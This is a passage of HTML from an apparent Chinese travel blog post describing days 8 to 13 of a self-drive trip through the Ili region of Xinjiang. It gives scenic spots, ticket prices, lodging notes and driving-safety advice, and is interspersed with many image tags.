alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/c6ae9bd9c2f9e23f9fc0c3b9778621f5\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><ul>\n<li>⭐️ 景点：果子沟日出+果子沟大桥+薰衣草庄园+伊昭公路</li>\n<li>⭐️ 行程：早上起来去果子沟大桥看日出，可惜今天天气不好，吃完早饭离开民宿后又跑过去看了一下，晴天下的果子沟大桥也很美。</li>\n<li>继续开车去 霍城 的解忧公主薰衣草庄园，因为过了花期，门票便宜了一半，景色也不如预期（建议 5 到 6 月来）。买了些薰衣草的产品（实际上在景区外面更便宜），午饭在路边随便挑了一家牛肉面，味道很赞。</li>\n<li>因为这几天拍的照片多，赶往伊宁市电脑城买硬盘，然后出发走刚开通没几天的伊昭公路（S237），赶往昭苏 。伊昭公路很美，山路没那么难开，路上可以停车拍照的地点也很多，非常值得专门跑一趟。</li>\n<li>⭐️ 门票：薰衣草庄园 18 元 /人（半价）</li>\n<li>⭐️ 住宿地点： 昭苏县、昭苏马厩里民宿（房间很赞，晚上可以看星星，关键饭很好吃，后悔没多住一晚）</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/11175c0f35462f5f1f7c184079eb6f3f\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/318856b4507066b7dbefb35bcb7ab295\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/62b9380b58a6e2ff658ffd8e175a21f8\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/274cce484e9616377cd29c19099b4269\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/58cdd2a390114a617022da8f531d835e\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/1ec5b809c3b01f1868e704c807a5c743\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/5c97ede76bf20ef0327fc1c190de2ed3\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/c2c8df82efdb9f62c5ad3471fc4bdfc8\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/c8af3d4ba512cf36faae1e765f2ebb4b\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/9d4c73b566a186471127589195e53919\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/c66effbc270d06ffe33f5a78c4927636\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/0a613ce9a1089df8758ce32aac4f34ff\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/0e31675f0bf6836b5b94ca8fd6952607\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/f531f672cfc752540b15995ea0feca38\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/75cb886ca3a8d8291ba6670f803656d6\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/f60f2cd578e306193bcebbe895dc7e43\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/998213ad5cb1d60f2d3ae3fb497120b0\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/097ce6e0086dda50ab323134ee8fc5ad\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/01421e6134831a9e53cd3d69d64840dd\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/a013600dc486d5c736db4cb60589463b\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/e31f18cc3474171310b6551606d89783\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/96029770297e1d3e8020bac22d8269d2\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><h2>第 9 天：昭苏—夏塔景区—特克斯（住宿）</h2>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/b38f1a64e523dce6f740300a788ae554\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/a4b71edb4596ae3b128d57a310b913ae\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><ul>\n<li>⭐️ 景点：夏塔景区</li>\n<li>⭐️ 行程：夏塔景区是出行前临时加的行程，没想到从早上出昭苏县城开始，眼睛就一直被美景覆盖，一路的油菜花，向日葵，配着远景中的雪山和蓝天，非常的纯净美丽。听当地人说今年的油菜花开的不好，早两年更美。后面还听说这几天是昭苏的天马节，可惜没预留时间去看一看。</li>\n<li>夏塔景区相比前面的景区，运营简陋了很多，路牌和指引都不明显，导致我们顺着木栈道走出很远，才意识到走错路了（徒步过去 7 公里，建议坐电瓶车过去）。更省力的行程是景区大巴车下车之后，继续靠着左侧走 200 米找到景区电瓶车（50 元/人），买票去景区最里面。虽然走错了一段路，遥遥望着天山山脉的第二高峰汗腾格里峰（6995 米）配蓝天的风景很好，也减缓了郁闷情绪的继续蔓延。</li>\n<li>夏塔在蒙古语中有阶梯之意，这里有丝绸之路上最险峻的古隘道——夏塔古道，是伊犁通往 南疆的唯一捷径，在 1300 多年前，唐玄藏途经夏塔古道去印度取经，从而使条古道闻名于世。</li>\n<li>以后再来可以预留 2 天时间，沿着夏塔古道徒步一段路程，据说还可以露营，不过穿越夏塔古道的话难度很大（120 公里）。</li>\n<li>夏塔景区也是此次 新疆 自驾令人惊喜的一个景点了，以后一定会再来。</li>\n<li>⭐️ 门票：夏塔景区门票 38 元，交通车 2 段单独收费（40+50）</li>\n<li>⭐️ 住宿地点： 特克斯库什台驿站（条件一般，导航不准需要提前问好路线）</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/5b5a77fdaecf9d4ffada74f600e9a136\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/79c2e3a1c424233c9a064548b4fde1f8\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/eaa84fa8be0f8ca31919e73ddae76857\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/3f8ba1467fb753d5009cb844ab54d741\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/24ffee879142bf16df0c9dd7d24b4a85\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/170fa76526c1bb0d84580788675e0afc\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/b8e8147bcf0491349ff4324412faabbd\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/2659e401f56130e32c883e36c2b3df4e\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/b34042fdc039c2784a600a052d8d55ba\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/734ada1cbe06214548b60c02a70c884e\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/0ffc367b20c3411d93506580ef3e3b40\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/f83ef0e86d17b3b6197731e4b89321be\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/cf4b0d0730c14a558ff75498dfa64216\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/0d6cddea9edd72586c2359a881080b58\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/70104cf73d579509f275ebb332bf9bd7\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/afcdb60e7048f1cbe8c0cb6e9db76780\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/26aaf915f32a39775f25a1fef99481e4\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/65c2568acc55d69763c5814641ac2eab\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/d46dba00f93a92b234352840b5205093\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/d578bc947d859a7ecd24c35b6ff43790\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><h2>第 10 天：特克斯-琼库什台-喀拉峻（住宿）</h2>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/1eee0985ee5a07dbad964152ff68a104\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/33f2dd4876b0807df91ca5e9b783c86c\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><ul>\n<li>⭐️ 景点：琼库什台（原始古朴村落）</li>\n<li>⭐️ 行程：早上从特克斯县去琼库什台，路上有大片的人体草原和九曲十八弯，还有牛奶河，隔几公里可以拍拍照。因为天气也很棒，这段路比后面去的喀拉峻和那拉提要美。不过山路还是有点难走，路很窄，会车以及转弯时需要控制速度。</li>\n<li>到达琼库什台村落之后继续开车向上走，在山顶停车，有一个云海饭店有观景草甸，风景很美。在饭店吃了午饭往下开，把车停在村口停车场，可以沿着乌孙古道徒步或骑马，周边转一转，看看风景散散步，有条件的话看看日落日出。</li>\n<li>下山的路上碰到很漂亮的森林和小溪，还遇到了很可爱的少数民族的小孩，蹭了下马拍拍照，把车上的零食都拿给他了哈哈。傍晚计划下山看夕阳，然后去喀拉峻旁边的伊景大酒店（离喀拉峻很近，住宿条件还可以，尴尬的是当晚没有水。</li>\n<li>有一个小插曲：下山在快到山底的时候车速控制不及时，发生了剐蹭。报交警之后大概半小时到达现场协助处理，也同时报了神州租车的客服和保险，约定好第二天去 特克斯 县交警大队拿事故认定书。所以大家开车要注意安全，控制车速，不要疲劳驾驶。最好找一个僚机，在后面跟着，转弯或有其他突发状况，都能提前预判。另外如果是自己的车需要提前做次保养，如果租的车需要多了解车的性能，长上坡和下坡需要熟悉刹车和油门的状态。（听交警同志说近期的每天的事故很多，有剐蹭的酒驾的逃逸的，所以一定要注意安全）</li>\n<li>⭐️ 门票：无</li>\n<li>⭐️ 住宿地点：喀拉峻-伊景大酒店（房间不错，离喀拉峻也很近，就是当晚竟然没有水！）</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/c1921549685b56f36e15d0309cb646ee\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/5dc26244ef558acc6b4616237df63695\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/35966e78f7ce4caefcacf8f66edd8cc5\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/8a6896b5c2cda536b97569bc0c31831b\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/9b45930bd696ce264a9a938b6fdd8662\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/eefe5368ffbd377eabcdcc2cab3374e5\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/644c95b92d4efea0dc572401c72dc42b\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/8a7815c4b985acb94ef73a2f40bc1472\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/4296ccc619b1d5c1af748ac285f174b3\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/71130267c065dd2d39c74b1f745fd27e\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/975ebcf9d52057b2acfc0ed3fa038400\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/6c8ba24e8449f74cd4b7776eb1d2491e\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/b72baafba28ce126a480a3cc0634e9e8\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/976845645436f8b62ae5285c39ad4399\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/fc58a4c2b6a79c664169d043c3b35f04\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/6c114558a06c204374bb1b58dc7a6d1c\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/0af1709cbd92eea7ba70a57fc7152af2\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/9cc309c94390a39bef3b7511f34af85c\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/c8d833c2c71f3e7f9f5fce9441332ea8\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/a5078225a673225031a0fd7eac84f91e\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/6e174f5fa95532d88da655a9268f660c\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/b00e08425b500ac7ebdd607b1c08bc36\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/b8f3d605c2ff957496f7958f31374da5\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/92aeacca4ca42b9e731c2eebb35fbe52\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/219c20a85fe05dd387e21d41c165d688\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/cd9136783e409378e4c925d4316f233d\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/faffe85c59d2fc34185a096e0495154e\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/ced883e30ccdaa3ef85eb0b6ffd9dfa0\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/b0d5dbbd82139dc3bf2b4d8a210f386e\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/34b4c741f871371bcf357896e74d3a90\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/53345a8d0333d112fdca3d0793b6e82e\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/eb0bf21aa3fcedfdbb8334774ec76eb3\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/a08ddbc7d44600311b458bae3d9a0c2e\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/814babf474dde2ecf625284fc2482a23\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/010a0c445640e0272b53d9abf5ca22fc\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/bad0d6083b00a9951cee871ccda16b43\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><h2>第 11 天：喀拉峻大草原-特克斯（住宿）</h2>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/75756a4053adc51ca76f3b568c66eab6\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/6fb1c84cc4f6f3ec6116aeacaa0e126b\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><ul>\n<li>⭐️ 景点：喀拉峻大草原（鲜花台、猎鹰台（推荐）、 库尔带峡谷）</li>\n<li>⭐️ 行程： 早上从伊景大酒店开车去喀拉峻，喀拉峻景区分为东西喀拉峻和阔克苏大峡谷（需要单独买票）。因为行程紧张，加上近几年阔克苏大峡谷的草被长的一般，就只买了东西喀拉峻的门票。</li>\n<li>东西喀拉峻的景色主要在东喀拉峻，景区（不能自驾）坐景交车进入，先到鲜花台，越往里走越美（4 至 5 公里），不过 7 月份鲜花都凋谢的差不多了，如果五六月份来一定很美。下一个停车点是猎鹰台， 建议往 库尔 带森林峡谷的方向走一走，也可以骑马。</li>\n<li>今天的天气一般，加上要赶去特克斯处理事故，只去了喀拉峻草原，所以玩的一般。不过回头看照片的时候，景色还是不错的，可惜天气和时节不太对。</li>\n<li>如果要深度游，建议可以拿一整天或者两天来深度游玩一下。</li>\n<li>正好这几天是少数民族的古尔邦节（类似汉族的春节，放假 3 天，高速免费），出来游玩的人很多，原打算晚上去特克斯离街凑凑热闹，可惜太累了就作罢。除了景区直接开车回特克斯 。</li>\n<li>⭐️ 门票：喀拉峻大草原门票 135 元 /人（含景区车票），阔克苏大峡谷需单独买票</li>\n<li>⭐️ 住宿地点： 特克斯 易栖民宿（城边小院子环境不错，附近不远有大片的向日葵据说有小路开过去）</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/3de5bf9e090f6935632dcba4039ac160\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/323efd90264cda08d1af69c826f1de4b\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/fc82332a576f04009da722f851690078\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/bb4cda8879e8ace406e54836cca57bfd\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/75161222d92a90066c45ed69c6aa93fb\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/b6ba2aa2a58915ee9ec4b4e7e4c20f23\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/a97af5b8677035b2861a5b7a622a8d37\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/f5eb57bfeabf0f8b2cd82022ba0628c9\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/533520604679939871d24d072e424ecb\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/bf957cd95739033fd115de9639976fe8\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><h2>第 12 至 13 天：那拉提（住宿）</h2>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/42116acfda1f4be95951f70bb0826b1c\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/96952f58cc3599777e3b5dc47d08d556\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><ul>\n<li>⭐️ 景点：那拉提（空中草原、河谷草原、游牧人家、沃尔塔交塔）</li>\n<li>⭐️ 行程：那拉提草原是世界四大高山河谷草原之一，所以提前是预留了 2 天时间，不过之前一直晴天的伊犁这两天天气不佳，雾气朦胧的，所以就正好休整了 2 天，有些遗憾。</li>\n<li>第 12 天：建议尽早出发，景区外有一些堵车，我们自驾进入景区的时候已经下午了，天气有些阴沉，视野也一般，先去了海拔 2200 米左右的空中草原，然后是河谷草原和游牧人家。那拉提景区附近的道路车很多，如果自驾可以提前买好电子票（48 小时有效）报备车牌信息，根据现场指示自驾进入景区。</li>\n<li>第 13 天：原本计划去沃尔塔交塔（不允许自驾，120 元/人），因为天气依旧是阴天，加上最近比较累，所以就修整了一天，下午去景区转了一圈，天气比前一天更阴霾。</li>\n<li>整体来看，喀拉峻大草原和那拉提因为天气一般，景色不如预期好。不过在路上遇到了更美的风景，也算有得有失。据其他博主说，5 月喀拉峻和 6 月那拉提都很美，7 月需要看天气。</li>\n<li>⭐️ 门票：8:30 开始网络售票，48 小时有效，门票 95 元，景交车每条线路 40 到 120 元不等，自驾一人 300 元（当天 0 点至 22 点可进入），沃尔塔交塔不允许自驾，车票 120 元</li>\n<li>⭐️ 住宿地点： 那拉提 新源 云谷喜院民宿（环境不错，周围吃的也很多，出了院子能看到那拉提的景色）</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/98015b3461fc8e1c6f52202d2dcc3dc0\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/article/2dc62121a02a00ffbe41b82dba2677cd\" alt=\"新疆16天自驾攻略——草甸雪山落日星空，在路上，遇见大美的新疆\"></figure><figure class=\"image ss-img-wrapper\"><img 